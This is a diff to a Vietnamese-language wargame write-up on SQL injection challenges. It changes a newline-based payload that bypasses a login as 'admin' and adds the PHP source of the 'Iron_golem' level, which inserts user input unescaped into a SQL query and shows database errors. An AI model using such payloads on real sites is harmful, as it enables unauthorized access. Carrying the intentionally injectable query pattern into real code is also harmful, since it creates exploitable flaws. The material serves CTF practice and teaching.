@@ -629,4 +629,28 @@ for j in range(1,25):
 
 Dấu `#` ở bài này là comment đoạn query nên ta sẽ không nhập được password để bypass câu này thì ta chỉ cần xuống dòng mà xuống dòng trong urlencode là `%0a` nên ta sẽ có đoạn payload
 
-\=>payload : /?pw='%0a and pw='du-ma-mat-me-ban-phim-r' or id = 'admin' -- -
+\=>payload : /?pw='%0a and pw='j1s0o' or id = 'admin' -- -
+
+
+
+## Iron\_golem
+
+```php
+<?php
+  include "./config.php"; 
+  login_chk(); 
+  $db = dbconnect(); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
+  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(mysqli_error($db)) exit(mysqli_error($db));
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  
+  $_GET[pw] = addslashes($_GET[pw]);
+  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
+  highlight_file(__FILE__);
+?>
+```
